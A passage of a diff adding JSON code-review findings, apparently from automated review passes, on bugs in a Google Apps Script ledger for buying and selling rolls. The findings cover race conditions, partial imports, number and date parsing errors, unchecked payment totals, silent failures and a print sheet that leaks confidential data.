+  "fix": "First line of `cekInbox`: `var lock = LockService.getScriptLock(); if (!lock.tryLock(0)) return;` and release in a `finally`.",
+  "_lens": "v2:8476f58939dff5647cb9e1875ca9f088e70e841048c1466fc90809f5110fe8e5"
+ },
+ {
+  "title": "ITEM rows are written before the NOTA row, so a crash between them leaves orphans and lets a retry double-write every gulungan",
+  "where": "tulisNota_ — ITEM written lines 322-326, NOTA written lines 349-351",
+  "scenario": "The 6-minute execution limit (or a transient Drive error) hits after the ITEM block and before line 351. The file moves to Lancelot-Gagal and Aldi re-drops it. `cariNota_` (line 441) finds no NOTA row, `petaSidik_` (line 383) reads NOTA only so the fingerprint map is clean, and the seri guard is inert because `kunciSeri_` returns '' when both SERI and LABEL are blank (lines 368-372) — which is normal for a handwritten nota without seri numbers. Every gulungan is written a second time; NOTA totals look right, ITEM has double the rows, and TOTAL BRUTO now disagrees with the gulungan sum in Aldi's favour or against him depending on which totals he trusts.",
+  "consequence": "WRONG DATA",
+  "likelihood": "sedang",
+  "fix": "Write the NOTA row first, then the ITEM rows; the orphan-nota check already in `cekKualitas` line 983 then covers the reverse crash.",
+  "_lens": "v2:8476f58939dff5647cb9e1875ca9f088e70e841048c1466fc90809f5110fe8e5"
+ },
+ {
+  "title": "The JUAL PABRIK exemption is applied to the stored side instead of the incoming side, so every real sale is rejected — and the error text tells the caller to switch BOTH guards off",
+  "where": "petaSeri_ line 407 (`if (jenis[no] === 'JUAL PABRIK') return;`); tulisNota_ lines 309-319; error strings lines 307 and 319",
+  "scenario": "Mita's gulungan KS 5 and KS 6 go in on a BELI PETANI nota. Aldi sells them to Om CK, so the JUAL PABRIK nota carries the same seri — exactly the case the comment on lines 365-366 says is allowed. But line 407 only excludes gulungan already stored under a sale nota; the buy nota stays in the map, and lines 313-315 test the incoming items against it without ever looking at the incoming nota's own JENIS NOTA. Every sale throws NOMOR SERI BENTROK. The thrown message (line 319) then instructs the caller to add `\"abaikanDuplikat\": true`, and that same flag also disables the same-photo-twice fingerprint check on line 302 — so the fix Claude is literally told to apply turns off the only protection against paying an agen twice.",
+  "consequence": "BLOCKED WORK",
+  "likelihood": "tinggi",
+  "fix": "Skip the seri block entirely when `String(d.jenisNota) === 'JUAL PABRIK'`, and split the flag into `abaikanKembar` and `abaikanSeri` so one cannot silently disable the other.",
+  "_lens": "v2:8476f58939dff5647cb9e1875ca9f088e70e841048c1466fc90809f5110fe8e5"
+ },
+ {
+  "title": "Nothing tells Aldi when an import fails or when the nightly check finds a BERAT problem",
+  "where": "cekInbox catch line 475; lapor_ lines 65-68 (UI alert swallowed by try/catch); cekKualitas lines 1019-1022; no MailApp/GmailApp in the file",
+  "scenario": "A photo JSON fails to parse at 14:05. `cekInbox` moves the file to Lancelot-Gagal and appends one row to LOG. Under a time trigger there is no UI, so `SpreadsheetApp.getUi()` throws and line 67 swallows it. Aldi sent the photo and assumes the nota is in the book. Same at 02:00: `cekKualitas` rewrites MASALAH and logs a line, but DASHBOARD shows no problem count and no message is sent. Three weeks of notas can be missing from RINGKASAN while every screen Aldi looks at appears normal.",
+  "consequence": "SILENT FAILURE",
+  "likelihood": "tinggi",
+  "fix": "One `MailApp.sendEmail` in `cekInbox` when `err > 0` and in `cekKualitas` when `berat > 0`, plus `=COUNTIF(MASALAH!A:A,\"BERAT\")` as a red card on the DASHBOARD.",
+  "_lens": "v2:8476f58939dff5647cb9e1875ca9f088e70e841048c1466fc90809f5110fe8e5"
+ },
+ {
+  "title": "A multi-nota file that fails partway can never be re-imported — the good notas block the retry",
+  "where": "tulisDariJson_ lines 450-455 (`data.forEach(tulisNota_)`, no rollback); cekInbox line 473",
+  "scenario": "One JSON holds three notas. Notas 1 and 2 are written; nota 3 throws (bad harga, seri clash, whatever). The exception propagates out of the forEach, the whole file goes to Lancelot-Gagal, and notas 1 and 2 are already in the sheet. Aldi fixes nota 3 and re-drops the file: nota 1 now fails `cariNota_` as already existing (line 263), the file fails again, and nota 3 still never gets in. It only lands if someone hand-edits the JSON — which nobody will.",
+  "consequence": "LOST DATA",
+  "likelihood": "sedang",
+  "fix": "Wrap the per-nota call in try/catch inside `tulisDariJson_`, collect the failures, and write only the failed notas back out as a new file in Lancelot-Gagal.",
+  "_lens": "v2:8476f58939dff5647cb9e1875ca9f088e70e841048c1466fc90809f5110fe8e5"
+ },
+ {
+  "title": "DIBAYAR — the number that decides what money leaves — is the one column no check ever validates",
+  "where": "tulisNota_ line 337 (`jT - oT + tambahan`); cekKualitas lines 981-995 check TOTAL BRUTO, TOTAL JUMLAH, LUNAS evidence and AGEN only",
+  "scenario": "Aldi (or anyone with edit access) clicks NOTA!O12 and types 935750 instead of 9357500, or drags a cell and shifts the column. `cekKualitas` recomputes TOTAL BRUTO and TOTAL JUMLAH from ITEM but never recomputes DIBAYAR, so MASALAH stays clean. RINGKASAN's `sum(DIBAYAR)` and the DASHBOARD's MODAL BELI card both quietly use the wrong figure, and the only trace is a single line in LOG among hundreds.",
+  "consequence": "WRONG DATA",
+  "likelihood": "sedang",
+  "fix": "Inside the `Object.keys(daftar)` loop (line 981) add: if `|DIBAYAR - (TOTAL JUMLAH - TOTAL ONGKOS)| > 1` and there is no `tambahan` note, report BERAT.",
+  "_lens": "v2:8476f58939dff5647cb9e1875ca9f088e70e841048c1466fc90809f5110fe8e5"
+ },
+ {
+  "title": "`catatEdit` records bulk deletions as a single meaningless line with no old values",
+  "where": "catatEdit lines 496-506, specifically `e.oldValue` line 501 and `e.range.getDisplayValue()` line 502",
+  "scenario": "Someone selects rows 20-50 in ITEM and presses Delete. onEdit fires once with a multi-cell range, where `e.oldValue` is undefined (it is only populated for single-cell edits) and `getDisplayValue()` returns just the top-left cell. LOG gets one row reading `ITEM!A20:P50 : \"(kosong)\" -> \"(kosong)\"`. Thirty gulungan are gone, the audit trail records nothing recoverable, and the only route back is last Sunday's backup — losing up to six days of other work.",
+  "consequence": "LOST DATA",
+  "likelihood": "sedang",
+  "fix": "When `e.oldValue` is undefined, log `e.range.getNumRows() * e.range.getNumColumns()` cells and the marker 'MASSAL — isi lama tidak tercatat', so at least the event is unmissable in LOG.",
+  "_lens": "v2:8476f58939dff5647cb9e1875ca9f088e70e841048c1466fc90809f5110fe8e5"
+ },
+ {
+  "title": "A tara unit mistake produces negative netto and negative money, and every quality rule passes",
+  "where": "hitungTara_ lines 117-120; tulisNota_ defaults line 265-266; cekKualitas checks lines 968-973",
+  "scenario": "The JSON says `caraTara: 'persen', nilaiTara: 10` meaning ten percent. Line 119 computes `bruto * 10`, so a 40 kg gulungan gets 400 kg of tara and netto -360; `jumlah` and DIBAYAR go negative. `cekKualitas` tests `bruto <= 0` (passes), `netto > bruto` (passes — it is smaller), and `netto * harga == jumlah` (passes, consistent). No finding is raised. The quieter twin: if the JSON omits `caraTara` entirely, lines 265-266 default to 'persen' + 0.1, so an agen who works on a flat 1 kg tara silently has 10% deducted from every gulungan, and the arithmetic check still passes.",
+  "consequence": "WRONG DATA",
+  "likelihood": "sedang",
+  "fix": "Add `if (netto <= 0) lapor('BERAT', ...)` to `cekKualitas`, and in `tulisNota_` throw when `caraTara` or `nilaiTara` is absent instead of defaulting to 10 percent.",
+  "_lens": "v2:8476f58939dff5647cb9e1875ca9f088e70e841048c1466fc90809f5110fe8e5"
+ },
+ {
+  "title": "Numeric-looking nota numbers become numbers on write, so QUERY drops rows from COMPILE and the duplicate check misses",
+  "where": "tulisNota_ line 351 (`setValues`); cariNota_ line 446; buatTampilan QUERY lines 670-678",
+  "scenario": "`setValues` stores the string \"1207\" as the number 1207, while migrated notas are text ('MITA', 'PAK MUL'). Google's QUERY infers one data type per column and returns blank for the minority type, so rows that exist in NOTA never appear in COMPILE or IN-OUT — the tabs Aldi actually reads. Separately, a nota numbered \"007\" is stored as 7, so `cariNota_`'s `String(v[i][0]).trim() === noNota` comparison on line 446 fails against \"007\" and the same nota can be entered twice.",
+  "consequence": "SILENT FAILURE",
+  "likelihood": "sedang",
+  "fix": "In `pasangSheet`, set the NO NOTA columns of NOTA and ITEM to plain-text number format (`setNumberFormat('@')`) so every nota number stays text.",
+  "_lens": "v2:8476f58939dff5647cb9e1875ca9f088e70e841048c1466fc90809f5110fe8e5"
+ },
+ {
+  "title": "LUNAS accepts free text, and anything but the exact word LUNAS reads as unpaid everywhere",
+  "where": "tulisNota_ line 339 (`d.lunas || 'BELUM LUNAS'`); migrasiPakMul_ line 627 (`String(v[10] || ...)`); cekKualitas line 988",
+  "scenario": "Claude transcribes a nota stamped 'sudah dibayar' as `lunas: 'SUDAH DIBAYAR'`. `setValues` bypasses the dropdown built on line 149 (data validation never blocks a script write), the conditional colouring on line 161 matches neither value so the cell stays white, and `cekKualitas` line 988 compares `=== 'LUNAS'` and treats the nota as outstanding. COMPILE shows it unpaid. Aldi transfers the money a second time.",
+  "consequence": "WRONG DATA",
+  "likelihood": "rendah",
+  "fix": "In `tulisNota_`, normalize: accept only 'LUNAS' / 'BELUM LUNAS' after uppercasing and trimming, and throw on anything else so the file goes to Lancelot-Gagal.",
+  "_lens": "v2:8476f58939dff5647cb9e1875ca9f088e70e841048c1466fc90809f5110fe8e5"
+ },
+ {
+  "title": "Every JUAL PABRIK nota is rejected by the seri-clash guard",
+  "where": "tulisNota_ lines 309-319; petaSeri_ line 407",
+  "scenario": "Aldi sells gulungan KS 5 and KS 6 (bought on nota MITA-03) to Om CK as nota JP-01. petaSeri_ builds its map from all ITEM rows, skipping only rows whose nota is already JENIS NOTA 'JUAL PABRIK' (line 407) — so KS 5 and KS 6 are in the map pointing at MITA-03. tulisNota_ lines 309-319 then check the INCOMING items against that map without ever looking at d.jenisNota, find both, and throw NOMOR SERI BENTROK. cekInbox line 475 moves the file to Lancelot-Gagal. The comment at lines 365-366 states the exact intent ('a gulungan legitimately appears again on a JUAL PABRIK nota'); the exemption was applied to the wrong side of the comparison. Result: the entire sell side of the ledger never enters, OMSET JUAL stays 0, and the DASHBOARD CUAN card shows minus the whole modal.",
+  "consequence": "BLOCKED WORK",
+  "likelihood": "tinggi",
+  "fix": "Skip the seri block in tulisNota_ when String(d.jenisNota).trim().toUpperCase() === 'JUAL PABRIK' — the same one-line exemption petaSeri_ already applies when reading.",
+  "_lens": "v2:062268a017459ac4e7733bf034421031004ec64caf134721d68b022238bd3ade"
+ },
+ {
+  "title": "Indonesian number strings silently become 1000x too small; angka_ exists but is never called",
+  "where": "tulisNota_ lines 274-277 and 337; angka_ defined lines 81-85, zero call sites in the file",
+  "scenario": "Lancelot reads 'Rp 57.500' off the paper nota and emits \"harga\": \"57.500\". Line 277 does Number(\"57.500\") = 57.5. jumlah = 65.7 x 57.5 = Rp 3.778 instead of Rp 3.777.750. Every guard passes: cekKualitas line 971 sees harga > 0; line 972 recomputes netto x harga from the same wrong harga so the two agree; line 986 compares TOTAL JUMLAH against the same wrong item sum. Same path for \"bruto\": \"40,5\" (Number = NaN, then || 0 at line 274 makes it 0 kg) and \"tambahan\": \"200.000\" (becomes Rp 200 at line 337). angka_ was written for exactly this and is dead code — and as written it would also return 57.5 for '57.500' and '' for 'Rp 1.500.000'.",
+  "consequence": "WRONG DATA",
+  "likelihood": "tinggi",
+  "fix": "One parser used by every numeric field: strip thousands dots, convert decimal comma, reject anything left over instead of returning 0. Fix angka_ to do that and actually call it at lines 274-277 and 337.",
+  "_lens": "v2:062268a017459ac4e7733bf034421031004ec64caf134721d68b022238bd3ade"
+ },
+ {
+  "title": "CARA TARA is compared untrimmed, so a flat-kg tara gets multiplied by bruto into negative money",
+  "where": "hitungTara_ line 119; tulisNota_ lines 265, 275-278, 281; cekKualitas lines 968-973",
+  "scenario": "JSON arrives with \"caraTara\": \"KG \" (trailing space) or \"Kg.\" or \"kilo\" and \"nilaiTara\": 2. Line 119 tests String(cara).toLowerCase() === 'kg', which fails, so it takes the percent branch: tara = bruto x 2. A 40 kg gulungan gets tara 80, netto -40, jumlah -40 x 55000 = -Rp 2.200.000. Nothing catches it: cekKualitas line 968 only tests bruto <= 0; line 969 tests netto > bruto (-40 > 40 is false); line 972 recomputes netto x harga and agrees. The negative flows into TOTAL NETTO, TOTAL JUMLAH, DIBAYAR (line 337), RINGKASAN sum(DIBAYAR) and the DASHBOARD MODAL card. No check anywhere in the file has a lower bound on netto.",
+  "consequence": "WRONG DATA",
+  "likelihood": "sedang",
+  "fix": "Normalize once at line 265 (String(d.caraTara||'persen').trim().toLowerCase()) and reject in tulisNota_ when tara > bruto or netto < 0 — cekKualitas's netto > bruto test is blind to the negative side.",
+  "_lens": "v2:062268a017459ac4e7733bf034421031004ec64caf134721d68b022238bd3ade"
+ },
+ {
+  "title": "An unparseable or missing date silently becomes the moment of import",
+  "where": "tanggal_ lines 100-101; called at 304, 329, 341, 601, 625",
+  "scenario": "d.tanggal is absent, or '25/7/26' (2-digit year), or '25/07/2026 14:30', or '12 Nopember 2026' / '5 Pebruari 2026' (spellings not in the month list at lines 94-97). Neither regex matches, new Date(t) is Invalid, and line 101 returns new Date() — today, with a time component. The nota is filed under the wrong date with no error, no LOG entry and no MASALAH row. Same in migrasiLama_ line 571 when cariSetelahLabel_ scans only row 1 (line 548) and returns '' — String('') matches nothing and the migrated nota is dated today. Consequences: the DASHBOARD month bars (line 794), the PERIODE filter (line 752) and the duplicate fingerprint (line 376) all key on that date.",
+  "consequence": "WRONG DATA",
+  "likelihood": "tinggi",
+  "fix": "Throw from tanggal_ instead of returning new Date(). cekInbox line 475 already routes a throw to Lancelot-Gagal with the filename in LOG, so a bad date becomes visible instead of plausible.",
+  "_lens": "v2:062268a017459ac4e7733bf034421031004ec64caf134721d68b022238bd3ade"
+ },
+ {
+  "title": "A mm/dd date rolls silently into a future year",
+  "where": "tanggal_ lines 90-91",
+  "scenario": "'7/25/2026' matches ^(\\d{1,2})/(\\d{1,2})/(\\d{4})$ and line 91 builds new Date(2026, 24, 7) — month index 24 rolls forward to 7 January 2028. Nothing bounds m[2] to 12. The nota lands two years out: it drops out of every PERIODE window (line 752), sorts to the top of COMPILE's 'order by TANGGAL desc', and its money never appears in the current month's MODAL. The softer half of the same bug is unfixable but should be flagged: '3/7/2026' is read as 3 March, and if the handwriting was mm/dd it was 7 March — same-format, wrong month, zero signal.",
+  "consequence": "WRONG DATA",
+  "likelihood": "sedang",
+  "fix": "Reject m[2] > 12 and m[1] > 31 at line 91 so an out-of-range value fails loudly instead of rolling over.",
+  "_lens": "v2:062268a017459ac4e7733bf034421031004ec64caf134721d68b022238bd3ade"
+ },
+ {
+  "title": "A multi-nota JSON writes partially, then the whole file is marked failed and can never be resubmitted",
+  "where": "tulisDariJson_ lines 450-455; cekInbox lines 473-475",
+  "scenario": "One file holds 3 notas. Nota 1 writes fully (ITEM rows at line 325, NOTA row at line 351). Nota 2 throws — duplicate seri, existing noNota, anything. forEach at line 453 stops, the exception propagates, and cekInbox moves the ENTIRE file to Lancelot-Gagal. Notas 2 and 3 exist nowhere. Aldi fixes the JSON and resubmits: nota 1 now hits line 263 ('sudah ada. Tidak ditimpa') and the whole file fails again. There is no path that gets notas 2 and 3 in without hand-editing the file, and nothing tells him which of the three landed.",
+  "consequence": "LOST DATA",
+  "likelihood": "tinggi",
+  "fix": "try/catch inside the forEach at line 453, count ok/gagal per nota, and write one LOG line per nota so the file's disposition stops being all-or-nothing.",
+  "_lens": "v2:062268a017459ac4e7733bf034421031004ec64caf134721d68b022238bd3ade"
+ },
+ {
+  "title": "No lock and no flush: two cekInbox runs compute the same target row and overwrite each other",
+  "where": "tulisNota_ lines 322-326 and 349-351; cekInbox 467-478; trigger created at line 510",
+  "scenario": "The 5-minute trigger (line 510) fires while the previous run is still writing — easy to reach, because the duplicate guards re-read all of NOTA and ITEM for every single nota (petaSidik_ 383-394, petaSeri_ 396-414), so a 15-file batch on a 3000-row ITEM tab can run past 5 minutes. Both executions call shI.getLastRow() + 1 (line 323) and shN.getLastRow() + 1 (line 349), get the same row, and both setValues over it. The second nota's gulungan land on top of the first's; the first NOTA row is replaced by the second. No LockService call exists anywhere in the file, and no SpreadsheetApp.flush(), so run B's cariNota_ (line 441) can also miss run A's uncommitted nota and let a true duplicate through. Aftermath: cekKualitas reports 'NO NOTA X tidak ada di tab NOTA' for orphaned gulungan (line 963) and no one knows which rows were destroyed.",
+  "consequence": "LOST DATA",
+  "likelihood": "sedang",
+  "fix": "LockService.getScriptLock().waitLock(30000) around the body of cekInbox. One line, and it is the only thing that makes getLastRow() + 1 safe.",
+  "_lens": "v2:062268a017459ac4e7733bf034421031004ec64caf134721d68b022238bd3ade"
+ },
+ {
+  "title": "Every failure reaches a human only if he happens to open the LOG or MASALAH tab",
+  "where": "lapor_ lines 65-68; cekInbox line 475; cekKualitas lines 1019-1022",
+  "scenario": "lapor_ wraps SpreadsheetApp.getUi() in try {} catch (e) {} — and getUi() always throws in a time-trigger context, so every message from a triggered run is discarded by design. A nota that fails to import writes one LOG row and parks the JSON in Lancelot-Gagal. The 02:00 cekKualitas can find 6 BERAT problems, write them to MASALAH, and tell nobody. Both channels are tabs Aldi has no reason to open unless he already suspects something is wrong — which is exactly the case where a nota is missing and he does not know it.",
+  "consequence": "SILENT FAILURE",
+  "likelihood": "tinggi",
+  "fix": "MailApp.sendEmail from cekInbox when err > 0 and from cekKualitas when berat > 0. The empty catch at line 67 already proves the UI path is dead in triggers.",
+  "_lens": "v2:062268a017459ac4e7733bf034421031004ec64caf134721d68b022238bd3ade"
+ },
+ {
+  "title": "KOREKSI is write-only — a recorded correction never changes a single number",
+  "where": "koreksiNota lines 458-463; T_KOREKSI is read by nothing in the file",
+  "scenario": "Aldi finds harga on nota MITA-03 was 55.000 not 57.500 and calls koreksiNota. A row lands in KOREKSI. NOTA and ITEM keep the wrong figures; cekKualitas still passes because the wrong values are internally consistent (line 972 recomputes from the same harga); COMPILE, RINGKASAN and the DASHBOARD keep summing the wrong amount; NOTA CETAK keeps printing it. Nothing joins KOREKSI back to a nota — there is not even a flag on the NOTA row saying a correction exists. The comment at line 457, 'Never edit a mistake away', means in practice that the mistake stays in every total forever.",
+  "consequence": "WRONG DATA",
+  "likelihood": "tinggi",
+  "fix": "Have cekKualitas read KOREKSI and raise a BERAT for every nota with a correction row, so the wrong figure is at least visibly marked as wrong wherever it is used.",
+  "_lens": "v2:062268a017459ac4e7733bf034421031004ec64caf134721d68b022238bd3ade"
+ },
+ {
+  "title": "DASHBOARD CUAN shows a large negative number whenever an agen is selected",
+  "where": "buatDashboard lines 756-770; tulisNota_ line 332",
+  "scenario": "MODAL filters JENIS NOTA='BELI PETANI' and OMSET filters 'JUAL PABRIK', both through the same AGEN condition in syarat (line 756). A sale nota has PABRIK filled and AGEN empty (line 332 writes d.agen || ''), so picking 'MITA' in B3 gives OMSET = 0 and CUAN = C6 - A6 = minus the entire modal, rendered bold gold on the card labelled 'CUAN'. The other branch is no better: if Lancelot does fill AGEN on sale notas, RINGKASAN's sum(DIBAYAR) per agen (line 683) mixes what Aldi owes the agen with what the pabrik owes Aldi, and perAgen at lines 799-803 double-counts the same gulungan and netto on both the buy and the sell nota. Even on SEMUA the two cards use different bases — MODAL uses DIBAYAR (net of ongkos, plus the invisible tambahan) while OMSET uses gross TOTAL JUMLAH.",
+  "consequence": "WRONG DATA",
+  "likelihood": "tinggi",
+  "fix": "Blank the CUAN card when $B$3 <> 'SEMUA', and drive both cards off the same base column. Buy-to-sell linkage per agen does not exist in the data.",
+  "_lens": "v2:062268a017459ac4e7733bf034421031004ec64caf134721d68b022238bd3ade"
+ },
+ {
+  "title": "The CUAN printed on NOTA CETAK is the freight line, not the margin",
+  "where": "buatNotaCetak lines 929-933",
+  "scenario": "I8 computes VLOOKUP(TOTAL JUMLAH) - VLOOKUP(DIBAYAR) for the SAME nota in B3. DIBAYAR is defined at line 337 as jT - oT + tambahan, so the difference is algebraically TOTAL ONGKOS - tambahan. On a buy nota with ongkos 10.000/gulung over 20 gulungan and no tambahan, the card reads 'CUAN Rp 200.000'. Aldi's real margin is a pabrik nota minus a buy nota — two different rows, which a single VLOOKUP on one nota number cannot reach. He is being shown a number labelled profit that has nothing to do with profit, on the sheet he prints.",
+  "consequence": "WRONG DATA",
+  "likelihood": "tinggi",
+  "fix": "Remove the field or resolve the matching sale through ITEM's NO NOTA JUAL column, which already exists (CI['NO NOTA JUAL']).",
+  "_lens": "v2:062268a017459ac4e7733bf034421031004ec64caf134721d68b022238bd3ade"
+ },
+ {
+  "title": "NOTA CETAK fails OPEN — clearing one cell reveals the pabrik nota",
+  "where": "buatNotaCetak lines 891, 916-918 (A12), 925-927 (H12), 930-932 (I8)",
+  "scenario": "The confidential block is hidden only while E3 equals exactly 'UNTUK AGEN'. Press Delete on E3, paste over it, or type 'agen' and both IFs go false: H12 renders the pabrik's SERI / NETTO / HARGA / JUMLAH and I8 renders the cuan, on the same printable page as the agen block (columns A-F and H-L, no print range set). The default direction is wrong — an unrecognised value shows the secret. Separately, the left block at A12 is NOT gated by mode at all: put a JUAL PABRIK nota number in B3 and the table headed 'NOTA UNTUK AGEN' prints the pabrik's gulungan with the pabrik's NETTO, which is precisely the timbangan margin Aldi's rule at line 866-867 exists to hide.",
+  "consequence": "LEAKED DATA",
+  "likelihood": "sedang",
+  "fix": "Invert the test to IF($E$3=\"UNTUK SAYA\", show, \"\") so blank, cleared or mistyped hides the block, and put the same gate on A12.",
+  "_lens": "v2:062268a017459ac4e7733bf034421031004ec64caf134721d68b022238bd3ade"
+ },
+ {
+  "title": "tambahan changes what Aldi pays but is stored in no column and checked by nothing",
+  "where": "tulisNota_ line 337; H_NOTA lines 31-37 (no TAMBAHAN column); cekKualitas lines 981-995; migrasiPakMul_ line 626",
+  "scenario": "DIBAYAR = jT - oT + (Number(d.tambahan) || 0). The tambahan itself is written nowhere. cekKualitas cross-checks TOTAL BRUTO (line 984) and TOTAL JUMLAH (line 986) against ITEM and never touches DIBAYAR or TOTAL ONGKOS at all. So DIBAYAR differs from TOTAL JUMLAH - TOTAL ONGKOS by an amount the system does not record, cannot verify and cannot explain. If the vision step misreads or invents a tambahan — migrasiPakMul_ line 626 passes Number(v[7]) straight through from a fixed column position — the payable is permanently wrong and no check can notice, let alone say why. The only trace is free text in CATATAN (line 629).",
+  "consequence": "WRONG DATA",
+  "likelihood": "sedang",
+  "fix": "Add TAMBAHAN as a stored column and one assert in cekKualitas: DIBAYAR == TOTAL JUMLAH - TOTAL ONGKOS + TAMBAHAN.",
+  "_lens": "v2:062268a017459ac4e7733bf034421031004ec64caf134721d68b022238bd3ade"
+ },
+ {
+  "title": "cekKualitas never checks TOTAL NETTO, JUMLAH GULUNG or DIBAYAR",
+  "where": "cekKualitas lines 977-995 (line 978 accumulates only bruto and jumlah; d.n is only tested for 0 at line 983)",
+  "scenario": "Edit one NETTO cell in ITEM by hand. TOTAL NETTO on the NOTA row is now stale and nothing reports it — line 978 accumulates d.bruto and d.jumlah only, so there is no netto comparison to fail. RINGKASAN's sum(TOTAL NETTO) (line 687) and the DASHBOARD per-agen NETTO column (line 801) are built on the stale value. Likewise, set JUMLAH GULUNG to 10 when ITEM holds 8 rows: d.n is counted but only ever compared to zero, so the mismatch is invisible while it feeds the duplicate fingerprint (line 378) and the GULUNG card (line 768). The nightly check is the thing everyone trusts, and this class of error is permanently outside its vision.",
+  "consequence": "SILENT FAILURE",
+  "likelihood": "sedang",
+  "fix": "Accumulate d.netto at line 978 and add three asserts in the loop at 981: TOTAL NETTO vs d.netto, JUMLAH GULUNG vs d.n, and netto >= 0 per item.",
+  "_lens": "v2:062268a017459ac4e7733bf034421031004ec64caf134721d68b022238bd3ade"
+ },
+ {
+  "title": "The nota printed for the agen lists OUT gulungan indistinguishably from paid ones",
+  "where": "buatNotaCetak lines 914-918; tulisNota_ line 281",
+  "scenario": "The agen-facing table prints NO, SERI, LABEL, PETANI, BRUTO, NETTO — there is no IN/OUT column and no total row. Meanwhile line 281 excludes every OUT gulungan from bT, nT, jT and oT, so TOTAL BRUTO, TOTAL NETTO and the money on the NOTA row cover only the accepted rolls. Aldi hands Mita a page listing 20 gulungan and 540 kg, then pays for 18 and 486 kg. Nothing on the paper says which two were rejected. This is a supplier dispute manufactured by the print layout, on the exact document that is supposed to settle the account.",
+  "consequence": "WRONG DATA",
+  "likelihood": "tinggi",
+  "fix": "Add i('IN/OUT') to the FILTER at line 917 and the header at 914 — the column already exists in ITEM.",
+  "_lens": "v2:062268a017459ac4e7733bf034421031004ec64caf134721d68b022238bd3ade"
+ },
+ {
+  "title": "A supplied netto is trusted without reconciling it against bruto and tara",
+  "where": "tulisNota_ lines 275-276; cekKualitas line 969",
+  "scenario": "JSON carries bruto 73 and netto 70 but no tara. Line 275 computes tara = 7.3 from the percent rule; line 276 takes netto = 70 as given. The row is written with three mutually inconsistent weights (70 + 7.3 != 73) and jumlah = 70 x harga — 2,7 kg x harga more than the tara rule says Aldi owes. cekKualitas only asks whether netto > bruto (line 969), which it is not, so this never appears in MASALAH. Repeated across a nota of 20 gulungan it is a five-figure overpay that reconciles perfectly against itself.",
+  "consequence": "WRONG DATA",
+  "likelihood": "sedang",
+  "fix": "When both bruto and netto arrive, derive tara = bruto - netto rather than computing it independently, and reject when a supplied bruto/tara/netto trio disagrees by more than 0.05 kg.",
+  "_lens": "v2:062268a017459ac4e7733bf034421031004ec64caf134721d68b022238bd3ade"
+ },
+ {
+  "title": "Money is stored with sub-rupiah float noise and displayed rounded",
+  "where": "tulisNota_ lines 278, 281, 337; number formats set at lines 144-146 and 158",
+  "scenario": "hitungTara_(73,'persen',0.1) returns 7.300000000000001, netto 65.69999999999999, jumlah 65.69999999999999 x 55000 = 3613499.9999999995. That raw value goes into the cell; the '\"Rp \"#,##0' format shows Rp 3.613.500. The number Aldi reads is not the number stored. jT then accumulates the noise into TOTAL JUMLAH and DIBAYAR, and those raw values are what RINGKASAN's sum(DIBAYAR) (line 683) and the DASHBOARD SUMPRODUCT (line 758) add up — so a column of visibly-correct rupiah totals to something that is not the sum of what is displayed. Rupiah has no sub-unit; storing fractions of one is modelling money wrong.",
+  "consequence": "WRONG DATA",
+  "likelihood": "tinggi",
+  "fix": "Math.round() jumlah at line 278, ong at 279 and the DIBAYAR expression at line 337 — round at write time, not in the display format.",
+  "_lens": "v2:062268a017459ac4e7733bf034421031004ec64caf134721d68b022238bd3ade"
+ },
+ {
+  "title": "A hand-typed date removes the nota's money from the dashboard entirely",
+  "where": "buatDashboard line 793; buatTampilan lines 670-673",
+  "scenario": "Aldi corrects a date in NOTA by typing '25 Juli' or '25-07-26'; Sheets stores it as text. Line 793 does if (!(t instanceof Date)) return; — that row is skipped, so its modal or omset leaves the KPI cards, its month bar and its per-agen row, silently. QUERY in COMPILE (line 670) drops minority-type values in the TANGGAL column the same way, so the row shows a blank date and sorts to the end. cekKualitas checks the date column not at all. The nota still sits in NOTA looking perfectly normal.",
+  "consequence": "SILENT FAILURE",
+  "likelihood": "sedang",
+  "fix": "Add a BERAT finding in cekKualitas when TANGGAL is not a Date object — one instanceof test in the loop at line 981.",
+  "_lens": "v2:062268a017459ac4e7733bf034421031004ec64caf134721d68b022238bd3ade"
+ },
+ {
+  "title": "LUNAS notas that DO have transfer proof are reported as missing it",
+  "where": "tulisNota_ lines 343-344; cekKualitas lines 991-992",
+  "scenario": "LINK BUKTI TRANSFER is written as the formula =IMAGE(\"...\"). getValues() on an IMAGE cell returns an empty string — the image is drawn over the cell, the cell has no value. So !String(g(r,'LINK BUKTI TRANSFER')).trim() is true for every paid nota, including all the ones whose proof is attached. Every LUNAS row gets a RINGAN 'LUNAS tapi tidak ada LINK BUKTI TRANSFER'. MASALAH fills with findings that are always false, so the one nota where the proof really is missing looks identical to the noise, and MASALAH stops being read.",
+  "consequence": "SILENT FAILURE",
+  "likelihood": "tinggi",
+  "fix": "Read that column with getFormulas() for this check, or store the URL in the cell and put the image in a note.",
+  "_lens": "v2:062268a017459ac4e7733bf034421031004ec64caf134721d68b022238bd3ade"
+ },
+ {
+  "title": "Deleted rows and pasted ranges leave no audit trail",
+  "where": "catatEdit lines 496-506; trigger created at line 513",
+  "scenario": "onEdit does not fire on row deletion — that is onChange, which is never installed. Deleting a NOTA row removes a nota, its money and the link to its ITEM rows with zero trace in LOG; the orphaned gulungan surface only at the next 02:00 run, as 'NO NOTA X tidak ada di tab NOTA' (line 963). For a paste over a range, e.oldValue is undefined and e.range.getDisplayValue() (line 502) returns only the top-left cell, so overwriting 40 HARGA cells is logged as one cell going from '(kosong)' to one value. The weekly backup (line 512) is the only recovery and can be six days stale.",
+  "consequence": "LOST DATA",
+  "likelihood": "sedang",
+  "fix": "Install an onChange trigger for REMOVE_ROW, and in catatEdit log the A1 range plus its dimensions when it is not a single cell.",
+  "_lens": "v2:062268a017459ac4e7733bf034421031004ec64caf134721d68b022238bd3ade"
+ },
+ {
+  "title": "A file whose name does not end in .json is skipped forever with no trace",
+  "where": "cekInbox line 472",
+  "scenario": "if (f.getName().slice(-5).toLowerCase() !== '.json') continue; — a file dropped as a Google Doc (Drive conversion strips the extension), or named 'nota 25-07.json ' with a trailing space, or '.jsonl', is skipped on every 5-minute run forever. No catat_, no move, no counter increment; cekInbox returns {masuk:0, gagal:0} and looks healthy. The nota never enters the ledger, and the only evidence is a file sitting in a folder Aldi has no reason to open.",
+  "consequence": "SILENT FAILURE",
+  "likelihood": "sedang",
+  "fix": "Log the filename and move it to Lancelot-Gagal instead of continue, so an unreadable drop is visible.",
+  "_lens": "v2:062268a017459ac4e7733bf034421031004ec64caf134721d68b022238bd3ade"
+ },
+ {
+  "title": "Folders are resolved by name across the whole Drive, trashed ones included",
+  "where": "folder_ lines 480-483; called at 468, 487, 514",
